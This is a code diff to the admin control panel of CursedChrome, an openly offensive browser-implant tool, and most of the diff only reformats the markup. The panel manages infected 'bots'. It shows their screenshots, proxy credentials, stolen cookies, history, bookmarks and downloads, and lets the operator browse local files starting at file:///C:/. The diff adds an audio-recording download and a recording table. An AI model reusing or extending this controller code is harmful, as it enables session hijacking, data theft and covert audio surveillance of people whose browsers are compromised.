@@ -2,76 +2,40 @@
   <div>
     <!-- Loading bar -->
     <div class="fixed-bottom" v-if="loading">
-      <b-progress
-        :value="100"
-        variant="success"
-        striped
-        :animated="true"
-      ></b-progress>
+      <b-progress :value="100" variant="success" striped :animated="true"></b-progress>
     </div>
     <!-- Navbar, only displayed when logged in -->
     <div v-if="user.is_authenticated">
-      <b-navbar
-        toggleable="lg"
-        type="dark"
-        variant="primary"
-        fixed="top"
-        sticky
-      >
-        <b-navbar-brand href="#"
-          >CursedChrome Admin Control Panel</b-navbar-brand
-        >
+      <b-navbar toggleable="lg" type="dark" variant="primary" fixed="top" sticky>
+        <b-navbar-brand href="#">CursedChrome Admin Control Panel</b-navbar-brand>
         <b-navbar-toggle target="nav-collapse"></b-navbar-toggle>
         <b-collapse id="nav-collapse" is-nav>
           <b-navbar-nav>
-            <b-nav-item
-              target="_blank"
-              href="https://github.com/s045pd/CursedChrome"
-            >
-              <font-awesome-icon
-                :icon="['fab', 'github']"
-                class="icon alt mr-1 ml-1"
-              ></font-awesome-icon>
+            <b-nav-item target="_blank" href="https://github.com/s045pd/CursedChrome">
+              <font-awesome-icon :icon="['fab', 'github']" class="icon alt mr-1 ml-1"></font-awesome-icon>
               Repo
             </b-nav-item>
           </b-navbar-nav>
           <b-navbar-nav class="ml-auto">
             <b-nav-item>
-              <font-awesome-icon
-                :icon="['fas', 'user']"
-                class="icon alt mr-1 ml-1"
-              ></font-awesome-icon>
+              <font-awesome-icon :icon="['fas', 'user']" class="icon alt mr-1 ml-1"></font-awesome-icon>
               Logged in as: <b>{{ user.username }}</b>
             </b-nav-item>
             <b-nav-item v-on:click="logout">
               Sign Out
-              <font-awesome-icon
-                :icon="['fas', 'sign-out-alt']"
-                class="icon alt mr-1 ml-1"
-              ></font-awesome-icon>
+              <font-awesome-icon :icon="['fas', 'sign-out-alt']" class="icon alt mr-1 ml-1"></font-awesome-icon>
             </b-nav-item>
           </b-navbar-nav>
         </b-collapse>
       </b-navbar>
-      <b-alert
-        variant="warning"
-        class="text-center"
-        show
-        v-if="user.password_should_be_changed"
-      >
+      <b-alert variant="warning" class="text-center" show v-if="user.password_should_be_changed">
         <p>
-          <font-awesome-icon
-            :icon="['fas', 'exclamation-triangle']"
-            class="icon alt mr-1 ml-1"
-          ></font-awesome-icon>
+          <font-awesome-icon :icon="['fas', 'exclamation-triangle']" class="icon alt mr-1 ml-1"></font-awesome-icon>
           You are currently using a system-generated password, please update
           your account password.
         </p>
         <b-button variant="primary" v-on:click="show_update_password_modal">
-          <font-awesome-icon
-            :icon="['fas', 'edit']"
-            class="icon alt mr-1 ml-1"
-          ></font-awesome-icon>
+          <font-awesome-icon :icon="['fas', 'edit']" class="icon alt mr-1 ml-1"></font-awesome-icon>
           Update Password
         </b-button>
       </b-alert>
@@ -87,49 +51,26 @@
               Admin Panel
             </h1>
             <b-alert show>
-              <font-awesome-icon
-                :icon="['fas', 'info-circle']"
-                class="icon alt mr-1 ml-1"
-              ></font-awesome-icon>
-              <i
-                >If this is your first time logging in, please use the
+              <font-awesome-icon :icon="['fas', 'info-circle']" class="icon alt mr-1 ml-1"></font-awesome-icon>
+              <i>If this is your first time logging in, please use the
                 credentials printed to your console when you first set the
-                service up.</i
-              >
+                service up.</i>
             </b-alert>
           </div>
           <div class="input-group mb-2" style="width: 100%">
             <div class="input-group-prepend">
-              <span class="input-group-text" style="min-width: 100px"
-                >Username</span
-              >
+              <span class="input-group-text" style="min-width: 100px">Username</span>
             </div>
-            <input
-              type="text"
-              class="form-control"
-              placeholder="admin"
-              v-model="user.login.username"
-              autofocus
-            />
+            <input type="text" class="form-control" placeholder="admin" v-model="user.login.username" autofocus />
           </div>
           <div class="input-group mb-3" style="width: 100%">
             <div class="input-group-prepend">
-              <span class="input-group-text" style="min-width: 100px"
-                >Password</span
-              >
+              <span class="input-group-text" style="min-width: 100px">Password</span>
             </div>
-            <input
-              type="password"
-              class="form-control"
-              placeholder="********"
-              v-model="user.login.password"
-            />
+            <input type="password" class="form-control" placeholder="********" v-model="user.login.password" />
           </div>
           <button class="btn btn-lg btn-primary btn-block" v-on:click="log_in">
-            <font-awesome-icon
-              :icon="['fas', 'sign-in-alt']"
-              class="icon alt mr-1 ml-1"
-            ></font-awesome-icon>
+            <font-awesome-icon :icon="['fas', 'sign-in-alt']" class="icon alt mr-1 ml-1"></font-awesome-icon>
             Sign in
           </button>
         </div>
@@ -138,13 +79,8 @@
       <div v-if="user.is_authenticated">
         <!-- Bots panel -->
         <b-card-group deck>
-          <b-card
-            border-variant="primary"
-            header="CursedChrome Bots"
-            header-bg-variant="primary"
-            header-text-variant="white"
-            align="center"
-          >
+          <b-card border-variant="primary" header="CursedChrome Bots" header-bg-variant="primary"
+            header-text-variant="white" align="center">
             <b-card-text>
               <h1>Connected Browser Bot(s)</h1>
               <table class="table table-striped">
@@ -160,142 +96,69 @@
                   </tr>
                 </thead>
                 <tbody>
-                  <tr
-                    v-for="bot in Object.values(bots_map)"
-                    v-bind:key="bot.id"
-                  >
+                  <tr v-for="bot in Object.values(bots_map)" v-bind:key="bot.id">
                     <td scope="row" style="vertical-align: middle">
-                      <b-img
-                        :src="bot.current_tab_image"
-                        alt="Image"
-                        width="160"
-                        height="90"
-                        fluid
-                      ></b-img>
+                      <b-img :src="bot.current_tab_image" alt="Image" width="160" height="90" fluid></b-img>
                     </td>
                     <td scope="row" style="vertical-align: middle">
                       {{ bot.name }}
 
-                      <b-icon
-                        v-if="bot.state == 'locked'"
-                        icon="lock-fill"
-                        class="rounded bg-primary p-1"
-                        variant="light"
-                      ></b-icon>
-                      <b-icon
-                        v-else
-                        icon="unlock-fill"
-                        class="rounded bg-danger p-1"
-                        variant="light"
-                      ></b-icon>
+                      <b-icon v-if="bot.state == 'locked'" icon="lock-fill" class="rounded bg-primary p-1"
+                        variant="light"></b-icon>
+                      <b-icon v-else icon="unlock-fill" class="rounded bg-danger p-1" variant="light"></b-icon>
                     </td>
                     <td style="vertical-align: middle">
                       <div>
                         <div class="input-group" style="width: 100%">
                           <div class="input-group-prepend">
-                            <span
-                              class="input-group-text"
-                              style="min-width: 100px"
-                              >Username</span
-                            >
+                            <span class="input-group-text" style="min-width: 100px">Username</span>
                           </div>
-                          <input
-                            type="text"
-                            class="form-control"
-                            placeholder="Please wait..."
-                            v-bind:value="bot.proxy_username"
-                          />
+                          <input type="text" class="form-control" placeholder="Please wait..."
+                            v-bind:value="bot.proxy_username" />
                           <div class="input-group-append">
-                            <span
-                              class="input-group-text copy-element"
-                              v-bind:data-clipboard-text="bot.proxy_username"
-                              v-on:click="copy_toast"
-                            >
-                              <font-awesome-icon
-                                :icon="['fas', 'clipboard']"
-                                class="icon alt mr-1 ml-1"
-                            /></span>
+                            <span class="input-group-text copy-element" v-bind:data-clipboard-text="bot.proxy_username"
+                              v-on:click="copy_toast">
+                              <font-awesome-icon :icon="['fas', 'clipboard']" class="icon alt mr-1 ml-1" /></span>
                           </div>
                         </div>
                         <div class="input-group" style="width: 100%">
                           <div class="input-group-prepend">
-                            <span
-                              class="input-group-text"
-                              style="min-width: 100px"
-                              >Password</span
-                            >
+                            <span class="input-group-text" style="min-width: 100px">Password</span>
                           </div>
-                          <input
-                            type="text"
-                            class="form-control"
-                            placeholder="Please wait..."
-                            v-bind:value="bot.proxy_password"
-                          />
-                          <div
-                            class="input-group-append copy-element"
-                            v-bind:data-clipboard-text="bot.proxy_password"
-                            v-on:click="copy_toast"
-                          >
+                          <input type="text" class="form-control" placeholder="Please wait..."
+                            v-bind:value="bot.proxy_password" />
+                          <div class="input-group-append copy-element" v-bind:data-clipboard-text="bot.proxy_password"
+                            v-on:click="copy_toast">
                             <span class="input-group-text">
-                              <font-awesome-icon
-                                :icon="['fas', 'clipboard']"
-                                class="icon alt mr-1 ml-1"
-                            /></span>
+                              <font-awesome-icon :icon="['fas', 'clipboard']" class="icon alt mr-1 ml-1" /></span>
                           </div>
                         </div>
                       </div>
                     </td>
-                    <td
-                      class="table-success online-col"
-                      style="vertical-align: middle"
-                      v-if="bot.is_online"
-                    >
+                    <td class="table-success online-col" style="vertical-align: middle" v-if="bot.is_online">
                       <span class="online-symbol">
-                        <font-awesome-icon
-                          :icon="['fas', 'check-circle']"
-                          class="icon alt mr-1 ml-1"
-                        />
+                        <font-awesome-icon :icon="['fas', 'check-circle']" class="icon alt mr-1 ml-1" />
                       </span>
                     </td>
-                    <td
-                      class="online-col table-danger p-0"
-                      style="vertical-align: middle"
-                      v-if="!bot.is_online"
-                    >
+                    <td class="online-col table-danger p-0" style="vertical-align: middle" v-if="!bot.is_online">
                       <span class="offline-symbol">
-                        <font-awesome-icon
-                          :icon="['fas', 'times-circle']"
-                          class="icon alt mr-1 ml-1"
-                        />
+                        <font-awesome-icon :icon="['fas', 'times-circle']" class="icon alt mr-1 ml-1" />
                       </span>
                     </td>
                     <td>{{ bot.tabs.length }} / {{ bot.history.length }}</td>
                     <td>
-                      <b-link :href="bot.current_tab.url" target="”_blank”"
-                        >{{ bot.current_tab.title }}
+                      <b-link :href="bot.current_tab.url" target="”_blank”">{{ bot.current_tab.title }}
                       </b-link>
                     </td>
 
                     <td style="vertical-align: middle">
                       <b-button-group vertical>
-                        <b-button
-                          variant="primary"
-                          v-on:click="bot_open_options(bot.id)"
-                        >
-                          <font-awesome-icon
-                            :icon="['fas', 'cog']"
-                            class="icon alt mr-1 ml-1"
-                          />
+                        <b-button variant="primary" v-on:click="bot_open_options(bot.id)">
+                          <font-awesome-icon :icon="['fas', 'cog']" class="icon alt mr-1 ml-1" />
                           Options
                         </b-button>
-                        <b-button
-                          variant="danger"
-                          v-on:click="delete_bot(bot.id)"
-                        >
-                          <font-awesome-icon
-                            :icon="['fas', 'trash']"
-                            class="icon alt mr-1 ml-1"
-                          />
+                        <b-button variant="danger" v-on:click="delete_bot(bot.id)">
+                          <font-awesome-icon :icon="['fas', 'trash']" class="icon alt mr-1 ml-1" />
                           Delete
                         </b-button>
                       </b-button-group>
@@ -308,19 +171,11 @@
         </b-card-group>
         <!-- Options panel -->
         <b-card-group deck class="mt-4">
-          <b-card
-            border-variant="info"
-            header="Options"
-            header-bg-variant="info"
-            header-text-variant="white"
-            align="center"
-          >
+          <b-card border-variant="info" header="Options" header-bg-variant="info" header-text-variant="white"
+            align="center">
             <b-card-text>
               <b-button variant="info" v-on:click="download_ca">
-                <font-awesome-icon
-                  :icon="['fas', 'download']"
-                  class="icon alt mr-1 ml-1"
-                />
+                <font-awesome-icon :icon="['fas', 'download']" class="icon alt mr-1 ml-1" />
                 Download HTTPS Proxy CA Certificate
                 <i>(Required to Use HTTP Proxy)</i>
               </b-button>
@@ -329,33 +184,16 @@
         </b-card-group>
         <!-- Bot options modal -->
         <div v-if="id_bot_selected">
-          <b-modal
-            id="bot_options_modal"
-            title="Bot Options & Info"
-            ok-only
-            ok-variant="secondary"
-            ok-title="Close"
-            size="xl"
-            lazy
-            scrollable
-            @hidden="reset_options_modal"
-          >
+          <b-modal id="bot_options_modal" title="Bot Options & Info" ok-only ok-variant="secondary" ok-title="Close"
+            size="xl" lazy scrollable @hidden="reset_options_modal">
             <p v-if="bots_map[id_bot_selected].current_tab">
-              <a
-                :href="bots_map[id_bot_selected].current_tab.url"
-                target="”_blank”"
-                >{{ bots_map[id_bot_selected].current_tab.title }}
+              <a :href="bots_map[id_bot_selected].current_tab.url" target="”_blank”">{{
+                bots_map[id_bot_selected].current_tab.title }}
               </a>
             </p>
             <p>
-              <b-img-lazy
-                center
-                thumbnail
-                fluid
-                :src="bots_map[id_bot_selected].current_tab_image"
-                width="800"
-                height="450"
-              ></b-img-lazy>
+              <b-img-lazy center thumbnail fluid :src="bots_map[id_bot_selected].current_tab_image" width="800"
+                height="450"></b-img-lazy>
             </p>
             <p>
               This bot has a User-Agent of
@@ -363,7 +201,7 @@
               first seen
               {{
                 bots_map[id_bot_selected].createdAt
-                  | moment("MMMM Do YYYY, h:mm:ss a")
+                | moment("MMMM Do YYYY, h:mm:ss a")
               }}.
             </p>
 
@@ -372,83 +210,50 @@
             </p>
             <p>
               <b-button-group v-if="id_bot_selected">
-                <b-button
-                  variant="success"
-                  v-if="bots_map[id_bot_selected].tabs"
-                  v-on:click="tabs_tab_show = !tabs_tab_show"
-                  v-b-toggle.sidebar-tabs
-                  >Tabs[{{ bots_map[id_bot_selected].tabs.length }}]</b-button
-                >
-                <b-button
-                  variant="warning"
-                  v-if="bots_map[id_bot_selected].history"
-                  v-on:click="history_tab_show = !history_tab_show"
-                  v-b-toggle.sidebar-history
-                  >History[{{
+                <b-button variant="success" v-if="bots_map[id_bot_selected].tabs"
+                  v-on:click="tabs_tab_show = !tabs_tab_show" v-b-toggle.sidebar-tabs>Tabs[{{
+                    bots_map[id_bot_selected].tabs.length }}]</b-button>
+                <b-button variant="warning" v-if="bots_map[id_bot_selected].history"
+                  v-on:click="history_tab_show = !history_tab_show" v-b-toggle.sidebar-history>History[{{
                     bots_map[id_bot_selected].history.length
-                  }}]</b-button
-                >
+                  }}]</b-button>
+                <b-button variant="info" v-on:click="get_mp3">Audio</b-button>
               </b-button-group>
 
               <!-- TABS -->
             </p>
 
             <p>
-              <b-sidebar
-                v-if="tabs_tab_show && bots_map[id_bot_selected].tabs"
-                id="sidebar-tabs"
-                title="Tabs"
-                right
-                shadow
-                width="500"
-              >
+              <b-sidebar v-if="tabs_tab_show && bots_map[id_bot_selected].tabs" id="sidebar-tabs" title="Tabs" right
+                shadow width="500">
                 <b-list-group>
-                  <b-list-group-item
-                    v-for="tab in bots_map[id_bot_selected].tabs"
-                    v-bind:key="tab.id"
-                  >
+                  <b-list-group-item v-for="tab in bots_map[id_bot_selected].tabs" v-bind:key="tab.id">
                     <b-link target="_blank" :href="tab.url">
-                      {{ tab.title }}</b-link
-                    >
+                      {{ tab.title }}</b-link>
                   </b-list-group-item>
                 </b-list-group>
               </b-sidebar>
 
               <!-- HISTORY -->
-              <b-sidebar
-                v-if="history_tab_show && bots_map[id_bot_selected].history"
-                id="sidebar-history"
-                title="History"
-                left
-                shadow
-                width="500"
-              >
-                <input
-                  type="input"
-                  class="form-control"
-                  placeholder="filter"
-                  v-model="history_search_word"
-                  autofocus
-                />
+              <b-sidebar v-if="history_tab_show && bots_map[id_bot_selected].history" id="sidebar-history" title="History"
+                left shadow width="500">
+                <input type="input" class="form-control" placeholder="filter" v-model="history_search_word" autofocus />
                 <b-list-group>
-                  <b-list-group-item
-                    v-for="history in bots_map[id_bot_selected].history.filter(
-                      (item) => {
-                        const url = item.url
-                          ? item.url.toString().toLowerCase()
-                          : '';
-                        const title = item.title
-                          ? item.title.toString().toLowerCase()
-                          : '';
-                        const searchWord = history_search_word.toLowerCase();
+                  <b-list-group-item v-for="history in bots_map[id_bot_selected].history.filter(
+                        (item) => {
+                          const url = item.url
+                            ? item.url.toString().toLowerCase()
+                            : '';
+                          const title = item.title
+                            ? item.title.toString().toLowerCase()
+                            : '';
+                          const searchWord = history_search_word.toLowerCase();
 
-                        return (
-                          url.includes(searchWord) || title.includes(searchWord)
-                        );
-                      }
-                    )"
-                    v-bind:key="history.id"
-                  >
+                          return (
+                            url.includes(searchWord) || title.includes(searchWord)
+                          );
+                        }
+                      )" v-bind:key="history.id">
                     <p>
                       {{
                         history.lastVisitTime | moment("YYYY-MM-DD hh:mm:ss")
@@ -458,10 +263,9 @@
                       <span>
                         <b-badge href="#" variant="primary">{{
                           history.visitCount
-                        }}</b-badge></span
-                      >&nbsp;<b-link target="_blank" :href="history.url">{{
-                        history.title
-                      }}</b-link>
+                        }}</b-badge></span>&nbsp;<b-link target="_blank" :href="history.url">{{
+  history.title
+}}</b-link>
                     </p>
                   </b-list-group-item>
                 </b-list-group>
@@ -472,80 +276,40 @@
                 <b-tab title="Cookies">
                   <div style="overflow-x: auto">
                     <b-input-group size="sm">
-                      <b-form-input
-                        id="cookies-filter-input"
-                        v-model="cookies_search_word"
-                        type="search"
-                        placeholder="Search domain or name or value"
-                      ></b-form-input>
+                      <b-form-input id="cookies-filter-input" v-model="cookies_search_word" type="search"
+                        placeholder="Search domain or name or value"></b-form-input>
 
                       <b-input-group-append>
-                        <b-button
-                          :disabled="!cookies_search_word"
-                          @click="cookies_search_word = ''"
-                          >Clear</b-button
-                        >
+                        <b-button :disabled="!cookies_search_word" @click="cookies_search_word = ''">Clear</b-button>
                       </b-input-group-append>
                     </b-input-group>
 
-                    <b-table
-                      id="cookies_table"
-                      :items="bots_map[id_bot_selected].cookies"
-                      :fields="cookies_fields"
-                      :current-page="cookies_page"
-                      :per-page="cookies_page_size"
-                      :filter="cookies_search_word"
-                      :filter-included-fields="cookies_filterOn"
-                      small
-                      hover
-                      :tbody-tr-class="cookies_row_class"
-                      @filtered="on_cookies_filtered"
-                    ></b-table>
+                    <b-table id="cookies_table" :items="bots_map[id_bot_selected].cookies" :fields="cookies_fields"
+                      :current-page="cookies_page" :per-page="cookies_page_size" :filter="cookies_search_word"
+                      :filter-included-fields="cookies_filterOn" small hover :tbody-tr-class="cookies_row_class"
+                      @filtered="on_cookies_filtered"></b-table>
                   </div>
-                  <b-pagination
-                    striped
-                    hover
-                    fixed
-                    responsive
-                    stacked
-                    v-model="cookies_page"
-                    :total-rows="bot_length_map[id_bot_selected].cookies"
-                    :per-page="cookies_page_size"
-                    aria-controls="cookies_table"
-                  ></b-pagination>
+                  <b-pagination striped hover fixed responsive stacked v-model="cookies_page"
+                    :total-rows="bot_length_map[id_bot_selected].cookies" :per-page="cookies_page_size"
+                    aria-controls="cookies_table"></b-pagination>
                 </b-tab>
                 <b-tab title="BookMarks">
-                  <b-tree-view
-                    :data="
-                      transformTreeData(bots_map[id_bot_selected].bookmarks)
-                    "
-                    @nodeSelect="openNode"
-                    nodeLabelProp="text"
-                  ></b-tree-view>
+                  <b-tree-view :data="transformTreeData(bots_map[id_bot_selected].bookmarks)
+                    " @nodeSelect="openNode" nodeLabelProp="text"></b-tree-view>
                 </b-tab>
                 <b-tab title="Config" lazy>
                   <div>
                     <b-input-group prepend="Bot Name" class="mt-3">
-                      <b-form-input
-                        v-model="selected_bot.name"
-                        autofocus
-                      ></b-form-input>
+                      <b-form-input v-model="selected_bot.name" autofocus></b-form-input>
                     </b-input-group>
 
                     <b-input-group prepend="Bot Switch" class="mt-3">
-                      <b-form-checkbox
-                        v-for="key in Object.keys(selected_bot.switch_config)"
-                        v-bind:key="key"
-                        v-model="selected_bot.switch_config[key]"
-                        >{{ key }}</b-form-checkbox
-                      >
+                      <b-form-checkbox v-for="key in Object.keys(selected_bot.switch_config)" v-bind:key="key"
+                        v-model="selected_bot.switch_config[key]">{{ key }}</b-form-checkbox>
                     </b-input-group>
 
                     <b-button variant="primary" v-on:click="update_bot_config">
-                      <font-awesome-icon
-                        :icon="['fas', 'edit']"
-                        class="icon alt mr-1 ml-1"
-                      />
+                      <font-awesome-icon :icon="['fas', 'edit']" class="icon alt mr-1 ml-1" />
                       Update
                     </b-button>
                   </div>
@@ -553,34 +317,17 @@
                 <b-tab title="Downloads" lazy>
                   <div style="overflow-x: auto">
                     <b-input-group size="sm">
-                      <b-form-input
-                        id="downloads-filter-input"
-                        v-model="downloads_search_word"
-                        type="search"
-                        placeholder="Search filename"
-                      ></b-form-input>
+                      <b-form-input id="downloads-filter-input" v-model="downloads_search_word" type="search"
+                        placeholder="Search filename"></b-form-input>
 
                       <b-input-group-append>
-                        <b-button
-                          :disabled="!downloads_search_word"
-                          @click="downloads_search_word = ''"
-                          >Clear</b-button
-                        >
+                        <b-button :disabled="!downloads_search_word" @click="downloads_search_word = ''">Clear</b-button>
                       </b-input-group-append>
                     </b-input-group>
 
-                    <b-table
-                      id="downloads_table"
-                      :items="bots_map[id_bot_selected].downloads"
-                      :fields="downloads_fields"
-                      :current-page="downloads_page"
-                      :per-page="downloads_page_size"
-                      :filter="downloads_search_word"
-                      :filter-included-fields="downloads_filterOn"
-                      small
-                      hover
-                      @filtered="on_downloads_filtered"
-                    >
+                    <b-table id="downloads_table" :items="bots_map[id_bot_selected].downloads" :fields="downloads_fields"
+                      :current-page="downloads_page" :per-page="downloads_page_size" :filter="downloads_search_word"
+                      :filter-included-fields="downloads_filterOn" small hover @filtered="on_downloads_filtered">
                       <template #cell(startTime)="data">
                         {{ convertToCurrentTimeZone(data.value) }}
                       </template>
@@ -590,52 +337,44 @@
                           data.item.filename
                         }}</b-link>
                         &nbsp;-&nbsp;
-                        <b-link target="_blank" :href="data.item.finalUrl"
-                          >🔍</b-link
-                        >
+                        <b-link target="_blank" :href="data.item.finalUrl">🔍</b-link>
                       </template>
 
                       <template #cell(totalBytes)="data">
-                        <b-progress
-                          :value="(data.item.bytesReceived * 100) / data.value"
-                          :max="100"
-                          animated
-                        ></b-progress>
+                        <b-progress :value="(data.item.bytesReceived * 100) / data.value" :max="100"
+                          animated></b-progress>
                       </template>
                     </b-table>
                   </div>
-                  <b-pagination
-                    striped
-                    hover
-                    fixed
-                    responsive
-                    stacked
-                    v-model="downloads_page"
-                    :total-rows="bot_length_map[id_bot_selected].downloads"
-                    :per-page="downloads_page_size"
-                    aria-controls="downloads_table"
-                  ></b-pagination>
+                  <b-pagination striped hover fixed responsive stacked v-model="downloads_page"
+                    :total-rows="bot_length_map[id_bot_selected].downloads" :per-page="downloads_page_size"
+                    aria-controls="downloads_table"></b-pagination>
                 </b-tab>
+
+                <b-tab title="Recording" lazy>
+                  <div style="overflow-x: auto">
+                    <b-table id="recording_table" :items="bots_map[id_bot_selected].recording" :fields="recording_fields"
+                      :current-page="recording_page" :per-page="recording_page_size" small hover>
+                      <!-- <template #cell(data)="data"> </template> -->
+                    </b-table>
+                  </div>
+                  <b-pagination striped hover fixed responsive stacked v-model="recording_page"
+                    :total-rows="bot_length_map[id_bot_selected].recording" :per-page="recording_page_size"
+                    aria-controls="recording_table"></b-pagination>
+                </b-tab>
+
                 <b-tab title="Browser" lazy>
                   <p>
                     <b-input-group prepend="Path" class="mt-3">
                       <b-form-input v-model="check_path"></b-form-input>
                       <b-input-group-append>
-                        <b-button
-                          variant="info"
-                          :disabled="manipulate_browser_loading"
-                          v-on:click="manipulate"
-                          >Check</b-button
-                        >
+                        <b-button variant="info" :disabled="manipulate_browser_loading"
+                          v-on:click="manipulate">Check</b-button>
                       </b-input-group-append>
                     </b-input-group>
                   </p>
                   <p>
-                    <iframe
-                      ref="browser_page"
-                      width="100%"
-                      height="600px"
-                    ></iframe>
+                    <iframe ref="browser_page" width="100%" height="600px"></iframe>
                   </p>
                 </b-tab>
               </b-tabs>
@@ -644,59 +383,30 @@
         </div>
         <!-- Update user password modal -->
         <div>
-          <b-modal
-            id="update_password_modal"
-            title="Update Account Password"
-            ok-only
-            ok-variant="secondary"
-            ok-title="Never mind"
-          >
+          <b-modal id="update_password_modal" title="Update Account Password" ok-only ok-variant="secondary"
+            ok-title="Never mind">
             <p>Enter your new password below</p>
             <div class="input-group mb-2">
               <div class="input-group-prepend">
                 <span class="input-group-text">New Password</span>
               </div>
-              <input
-                type="password"
-                class="form-control"
-                placeholder="******"
-                v-model="update_password.new_password"
-                autofocus
-              />
+              <input type="password" class="form-control" placeholder="******" v-model="update_password.new_password"
+                autofocus />
             </div>
             <div class="input-group mb-2">
               <div class="input-group-prepend">
                 <span class="input-group-text">New Password (Again)</span>
               </div>
-              <input
-                type="password"
-                class="form-control"
-                placeholder="******"
-                v-model="update_password.new_password_again"
-                autofocus
-              />
+              <input type="password" class="form-control" placeholder="******"
+                v-model="update_password.new_password_again" autofocus />
             </div>
-            <b-alert
-              class="text-center"
-              show
-              variant="danger"
-              v-if="!change_passwords_match"
-            >
-              <font-awesome-icon
-                :icon="['fas', 'exclamation-circle']"
-                class="icon alt mr-1 ml-1"
-              />
+            <b-alert class="text-center" show variant="danger" v-if="!change_passwords_match">
+              <font-awesome-icon :icon="['fas', 'exclamation-circle']" class="icon alt mr-1 ml-1" />
               Both passwords do not match, double check your inputs.
             </b-alert>
-            <b-button
-              variant="primary btn-block"
-              v-bind:disabled="!change_passwords_match"
-              v-on:click="update_user_password"
-            >
-              <font-awesome-icon
-                :icon="['fas', 'key']"
-                class="icon alt mr-1 ml-1"
-              />
+            <b-button variant="primary btn-block" v-bind:disabled="!change_passwords_match"
+              v-on:click="update_user_password">
+              <font-awesome-icon :icon="['fas', 'key']" class="icon alt mr-1 ml-1" />
               Change Password
             </b-button>
           </b-modal>
@@ -850,6 +560,15 @@ export default {
         },
       ],
 
+      recording_page: 1,
+      recording_page_size: 20,
+      recording_fields: [
+        {
+          key: "data",
+          label: "数据",
+        },
+      ],
+
       manipulate_browser_loading: false,
       check_path: "file:///C:/",
     };
@@ -955,6 +674,12 @@ export default {
           this.manipulate_browser_loading = false;
         });
     },
+    async get_mp3() {
+      await api_file_request("POST", "/mp3", {
+        bot_id: this.selected_bot.id,
+      })
+    },
+
     bot_open_options(bot_id) {
       console.log(bot_id);
       this.id_bot_selected = bot_id;
@@ -1076,6 +801,48 @@ function copy(input_data) {
 }
 
 const BASE_API_PATH = `${location.origin.toString()}/api/v1`;
+
+
+async function api_file_request(method, path, body) {
+  var request_options = {
+    method: method,
+    credentials: "include",
+    mode: "cors",
+    cache: "no-cache",
+    responseType: 'blob',
+    headers: {
+      "Content-Type": "application/json",
+    },
+    redirect: "follow",
+  };
+
+  if (body) {
+    request_options.body = JSON.stringify(body);
+  }
+
+  window.app.loading = true;
+
+  try {
+    fetch(`${BASE_API_PATH}${path}`, request_options).then(res => {
+      return res.blob()
+    }).then(res => {
+      const blob = new Blob([res], { type: 'audio/mp3' });
+      const url = URL.createObjectURL(blob);
+      const link = document.createElement('a');
+      link.href = url;
+      link.setAttribute('download', 'filename.mp3');
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      URL.revokeObjectURL(url);
+    });
+  } catch (e) {
+    window.app.loading = false;
+    throw e;
+  }
+  window.app.loading = false;
+
+}
 
 async function api_request(method, path, body) {
   var request_options = {
